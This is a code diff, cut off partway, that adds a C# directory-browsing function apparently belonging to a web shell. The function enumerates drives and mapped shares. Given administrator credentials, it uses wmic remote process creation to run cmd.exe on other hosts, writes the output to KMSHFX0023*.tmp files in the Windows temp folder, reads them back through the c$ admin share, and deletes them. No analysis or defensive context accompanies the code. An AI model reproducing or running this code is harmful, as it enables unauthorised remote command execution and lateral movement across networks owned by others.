@@ -1,0 +1,45 @@
+    string getDirectoryInfo(string address)
+    {
+        string ret="Error : -";
+        try {
+            if (address.ToLower()=="root"){
+                ret ="{\"dir\":[{\"name\":\"\\\\\\\\localhost\"}";
+                string netUse=exec("net use");
+                string[] lines=netUse.Split(new string[]{Environment.NewLine },StringSplitOptions.RemoveEmptyEntries);
+                foreach (string item in lines){
+                    if (item.ToLower().StartsWith("ok")){
+                        int index=item.IndexOf("\\\\");
+                        ret +=",{\"name\":\"\\\\"+item.Substring(index,item.IndexOf('\\',index+2)-index)+"\"}";
+                    }
+                }
+                ret +="]}";
+            } else{
+                if (address.StartsWith("\\\\")&& address.Trim('\\').Split('\\').Length==1){
+                    string tmp=address.ToLower().TrimEnd('\\');
+                    if (tmp=="\\\\localhost"){
+                        ret ="{\"dir\":[";
+                        bool isStart=false;
+                        foreach (System.IO.DriveInfo item in System.IO.DriveInfo.GetDrives()){
+                            if (item.IsReady){
+                                if (isStart)
+                                    ret +=",";
+                                ret +=string.Format("{{\"name\":\"{0}\",\"totalSize\":\"{1}\",\"freeSpace\":\"{2}\",\"sizeText\":\"{3}\",\"format\":\"{4}\",\"type\":\"{5}\"}}",item.Name.TrimEnd('\\').TrimEnd(':')+"$",item.TotalSize,item.TotalFreeSpace,"["+sizeFix(item.TotalFreeSpace)+"] free of ["+sizeFix(item.TotalSize)+"]",item.DriveFormat,item.DriveType);
+                                isStart =true;
+                            }
+                        }
+                        ret +="]}";
+                    } else{
+                        if (!string.IsNullOrEmpty(adminU)&& !string.IsNullOrEmpty(adminP)){
+                            string strWC=@"wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c > c:\windows\temp\KMSHFX0023{3}.tmp 2>&1 wmic logicaldisk get {4}"" 2>&1";
+                            string strWF=@"\\{0}\c$\windows\temp\KMSHFX0023{1}.tmp";
+                            string strWD=@"del {0} 2>&1";
+                            tmp =tmp.TrimStart('\\');
+                            exec(string.Format(strWC,tmp,adminU,adminP,1,"Caption"));
+                            exec(string.Format(strWC,tmp,adminU,adminP,2,"FileSystem"));
+                            exec(string.Format(strWC,tmp,adminU,adminP,3,"Size"));
+                            exec(string.Format(strWC,tmp,adminU,adminP,4,"FreeSpace"));
+                            exec(string.Format(strWC,tmp,adminU,adminP,5,"Description"));
+                            System.Threading.Thread.Sleep(3000);
+                            string[] diskTemp = new string[100];
+                            for (int i = 1; i <= 5; i++)
+                            {
